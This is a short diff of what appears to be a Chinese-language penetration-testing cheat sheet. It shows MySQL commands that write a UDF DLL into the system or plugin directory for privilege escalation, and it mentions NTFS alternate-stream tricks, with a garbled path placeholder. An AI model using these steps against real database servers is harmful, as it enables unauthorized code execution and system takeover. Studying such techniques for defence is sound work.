@@ -373,7 +373,7 @@
 					select load_file('C:\\Inetpub\\wwwroot\\udf32.dll') into dumpfile 'c:\\windows\\udf.dll' //低版本5.0以下
 				5.1以上版本
 					select @@plugin_dir
-					select load_file('C:\\?\\udf32.dll') into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin\\udf.dll' //高版本5.0以上
+					select load_file('C:\\????\\udf32.dll') into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin\\udf.dll' //高版本5.0以上
 
 				NTFS ADS文件流导出dll文件到plugin文件夹
 					解决Can't open shared library的情况，这时就需要我们把udf.dll导出到lib\plugin目录下才可以，但是默认情况下plugin不存在
